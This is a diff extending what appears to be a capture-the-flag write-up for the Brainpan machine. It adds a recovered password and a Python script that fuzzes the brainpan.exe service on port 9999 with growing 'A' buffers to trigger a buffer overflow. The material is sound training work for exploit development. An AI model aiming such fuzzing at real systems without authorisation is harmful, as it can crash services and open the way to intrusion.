@@ -117,4 +117,23 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
 So "shitsotrm" is the password, but other than saying "ACCESS GRANTED" it does nothing...
 from here we can understand that we need to exploit the application(brainpan.exe) behind the port itself to gain access.
 
-Loading up brainpan in **Immunity Debugger**, 
+Loading up brainpan in **Immunity Debugger**, we'll try to fuzz through brainpan with the following python code:
+
+```python
+import sys
+import socket
+
+buffer=["A"]
+counter=100
+
+while len(buffer) <= 30:
+    buffer.append("A"*counter)
+    counter=counter+200
+
+for string in buffer:
+    print("Fuzzing... with %s bytes" % len(string))
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect=s.connect(('111.61.0.117', 9999))
+    s.send((string + '\r\n'))
+    s.close()
+ ```
